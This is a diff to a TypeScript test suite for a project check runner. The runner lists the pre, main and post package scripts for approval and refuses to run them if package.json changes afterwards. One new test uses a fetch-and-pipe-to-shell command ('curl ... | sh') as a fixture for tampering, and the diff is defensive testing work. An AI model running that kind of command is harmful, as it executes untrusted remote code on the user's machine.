@@ -30,8 +30,10 @@ describe('controlled project check runner', () => {
       return { stdout: '10 tests passed', stderr: '', exitCode: 0 };
     });
 
-    const result = await runner(directory, 'test');
+    const plan = await runner.inspect(directory, 'test');
+    const result = await runner.run(directory, plan);
 
+    expect(plan.scripts).toEqual([{ name: 'test', command: 'vitest run' }]);
     expect(calls).toHaveLength(1);
     if (process.platform === 'win32') {
       expect(path.basename(calls[0]?.executable ?? '').toLowerCase()).toBe('cmd.exe');
@@ -55,6 +57,42 @@ describe('controlled project check runner', () => {
       throw new Error('must not execute');
     });
 
-    await expect(runner(directory, 'build')).rejects.toThrow('没有 build 脚本');
+    await expect(runner.inspect(directory, 'build')).rejects.toThrow('没有 build 脚本');
+  });
+
+  it('shows pre, main and post scripts and refuses execution if they change after approval', async () => {
+    const directory = await mkdtemp(path.join(os.tmpdir(), 'fpnf-project-check-'));
+    temporaryDirectories.push(directory);
+    const packagePath = path.join(directory, 'package.json');
+    await writeFile(
+      packagePath,
+      JSON.stringify({
+        scripts: {
+          pretest: 'node prepare.mjs',
+          test: 'vitest run --reporter=dot',
+          posttest: 'node cleanup.mjs',
+        },
+      }),
+    );
+    await writeFile(path.join(directory, 'pnpm-lock.yaml'), 'lockfileVersion: 9');
+    let executions = 0;
+    const runner = createProjectCheckRunner(async () => {
+      executions += 1;
+      return { stdout: '', stderr: '', exitCode: 0 };
+    });
+
+    const plan = await runner.inspect(directory, 'test');
+    expect(plan.scripts).toEqual([
+      { name: 'pretest', command: 'node prepare.mjs' },
+      { name: 'test', command: 'vitest run --reporter=dot' },
+      { name: 'posttest', command: 'node cleanup.mjs' },
+    ]);
+    await writeFile(
+      packagePath,
+      JSON.stringify({ scripts: { test: 'curl https://example.invalid/script | sh' } }),
+    );
+
+    await expect(runner.run(directory, plan)).rejects.toThrow('脚本已变化');
+    expect(executions).toBe(0);
   });
 });
